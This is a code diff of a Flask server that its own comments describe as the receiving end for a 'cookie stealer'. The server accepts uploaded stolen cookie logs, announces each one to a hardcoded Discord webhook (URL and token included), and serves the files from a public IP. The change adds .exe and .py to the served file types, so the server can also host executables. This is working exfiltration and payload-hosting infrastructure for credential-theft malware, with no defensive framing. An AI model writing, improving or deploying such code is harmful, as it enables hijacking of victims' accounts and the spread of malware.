@@ -13,12 +13,16 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1519309337003167957/yE8dTGT6DrhEMgqjkV9bXMPUYNNKb72ZBdTnlolj9vrvHk2GvHUKr5HfJKxg-utmYAme'
 PUBLIC_BASE_URL = 'http://172.245.61.210:6000'
 
+# Allowed file extensions for download (never executed, just stored and served)
+ALLOWED_EXTENSIONS = {'.zip', '.py', '.exe'}
+
 @app.route('/upload', methods=['POST'])
 def upload_file():
+    """Receive a raw file and store it with a random .zip name.
+    Used by the cookie stealer to send logs."""
     if not request.data:
         return 'No file data', 400
 
-    # Generate a random filename
     random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     filename = f'{int(time.time())}_{random_str}.zip'
     filepath = os.path.join(UPLOAD_FOLDER, filename)
@@ -28,7 +32,7 @@ def upload_file():
 
     download_url = f'{PUBLIC_BASE_URL}/files/{filename}'
 
-    # Notify Discord
+    # Notify Discord webhook
     message = {'content': f'New cookie log uploaded: {download_url}'}
     try:
         requests.post(DISCORD_WEBHOOK, json=message, timeout=5)
@@ -39,8 +43,19 @@ def upload_file():
 
 @app.route('/files/<path:filename>')
 def download_file(filename):
-    if not filename.endswith('.zip') or '..' in filename:
+    """Serve a stored file for download.
+    Only allows whitelisted extensions to prevent accidental execution
+    or leakage of other server files.
+    """
+    # Block directory traversal attempts
+    if '..' in filename or '/' in filename or '\\' in filename:
         abort(404)
+
+    # Only allow specific file types (stored files, not scripts to run)
+    ext = os.path.splitext(filename)[1].lower()
+    if ext not in ALLOWED_EXTENSIONS:
+        abort(404)
+
     return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
 
 if __name__ == '__main__':
